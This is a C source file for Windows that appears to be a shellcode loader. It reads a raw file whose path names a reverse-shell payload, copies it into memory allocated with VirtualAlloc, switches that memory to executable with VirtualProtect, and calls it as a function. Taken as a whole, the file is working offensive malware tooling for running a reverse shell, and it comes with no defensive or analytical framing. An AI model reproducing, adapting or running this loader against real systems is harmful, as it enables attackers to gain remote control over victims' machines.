#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string.h>

int main()
{
    char* path = L"D:\\other_projects\\reverse_shell\\reverse_shell_shellcode_raw";

    HANDLE hFile = CreateFileW(path, GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error: Failed to open file, %d", GetLastError());
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);

    if (fileSize == INVALID_FILE_SIZE)
    {
        printf("Error: Failed to get file size, %d", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    LPVOID shellcode_address = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    DWORD bytesRead;
    BOOL readFileResult = ReadFile(hFile, shellcode_address, fileSize, &bytesRead, NULL);

    if (!readFileResult || bytesRead != fileSize)
    {
        printf("Error: Failed to read file contents, %d", GetLastError());
        VirtualFree(shellcode_address, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    DWORD oldProtection; // keep the old protection
    BOOL virtualProtectResult = VirtualProtect(shellcode_address, fileSize, PAGE_EXECUTE_READWRITE, &oldProtection);

    if (!virtualProtectResult) {
        printf("Error: Failed to modify memory permissions, %d", GetLastError());
        VirtualFree(shellcode_address, 0, MEM_RELEASE);
        return 1;
    }

    void (*entryPoint)() = (void (*)())shellcode_address; // creating scode func
    entryPoint();


    printf("Returned from shellcode");
    VirtualFree(shellcode_address, 0, MEM_RELEASE);

    return 0;
}
